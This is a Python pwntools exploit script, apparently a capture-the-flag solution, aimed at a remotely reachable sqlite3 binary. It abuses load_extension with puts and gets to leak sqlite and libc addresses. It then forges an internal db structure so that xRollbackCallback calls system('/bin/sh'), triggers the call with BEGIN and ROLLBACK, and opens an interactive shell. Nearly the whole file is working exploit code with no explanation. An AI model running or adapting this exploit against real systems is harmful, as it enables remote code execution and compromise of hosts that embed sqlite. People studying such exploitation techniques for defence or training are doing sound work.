#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './sqlite3'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return remote(args.HOST, int(args.PORT))
    #if args.GDB:
    #    return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    #else:
    #    return remote('127.0.0.1', 9001) if args.REMOTE else process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
set sysroot
continue
'''.format(**locals())

# Copy sqlite3 and libc from the Docker container
e = ELF('./sqlite3',checksec=False)
libc = ELF('./libc-2.31.so',checksec=False)

io = start(stdin=PTY)

io.sendlineafter(b'sqlite> ', b"select load_extension('', 'puts');")
data = io.recv().split()

# Calculate sqlite base offset using leaked pointer
ptr = u64(data[5].ljust(8,b'\x00'))
print("PTR: %#x" % ptr)
sqlite_base = ptr-0x1589a0
globalDb = sqlite_base+0x157238
print("SQLITE_BASE: %#x" % sqlite_base)
print("GlobalDb: %#x" % globalDb)
io.sendline()

# Overwrite pVfs with address of localtime_r@got, so that we can leak libc
io.sendlineafter(b'sqlite> ', b"select load_extension('', 'gets');")
io.sendline(p64(sqlite_base+e.got['localtime_r']-0x48))
io.sendlineafter(b'sqlite> ', b"select load_extension('', '');")

# Parse leaked libc address and calculate libc base offset
data = io.recv().split()
ptr = u64(data[10].ljust(8,b"\x00"))
print("PTR_LIBC: %#x" % ptr)
libc.address = ptr - 0x9a6d0
print("LIBC_BASE: %#x" % libc.address)
print("SYSTEM@LIBC: %#x" % libc.sym.system)


binsh = next(libc.search(b'/bin/sh'))

# Crafted db structure with overwritten xRollbackCallback on offset 296 and its argument on offset 288
data = {
    0: sqlite_base+0x100,
    8: globalDb,
    16: sqlite_base+0x100,
    24: 0x0,
    32: globalDb,
    40:  0x5000000002,
    48:  0x800780e0,
    56:  p64(0x0)*2,
    72:  globalDb,
    80:  0x0,
    88:  0xff,
    96:  0x10100000000,
    104: 0x100000000ff0000,
    112: 0x7600,
    120: p64(0x0)*2,
    136: 0x3b9aca003b9aca00,
    144: 0x3e8000007d0,
    152: 0xee6b280000001f4,
    160: 0x7f,
    168: 0x7ffe0000c350,
    176: 0x3e8,
    184: 0x0,
    192: 0x2,
    200: 0,
    208: 0x42424242,
    216: p64(0x0)*9,
    288: binsh,
    296: libc.sym.system,
}

payload = fit(data)

# Restore corrupted db structure so that we can overwrite it again having all the necessary offsets
io.sendline(b'.open :memory:')

# Overwrite xRollbackCallback
io.sendlineafter(b'sqlite> ', b"select load_extension('', 'gets');")
io.sendline(payload)

# Trigger xRollbackCallback
io.sendlineafter(b'sqlite> ',b'BEGIN;')
io.sendlineafter(b'sqlite> ', b"ROLLBACK;")

# Get shell
io.interactive()
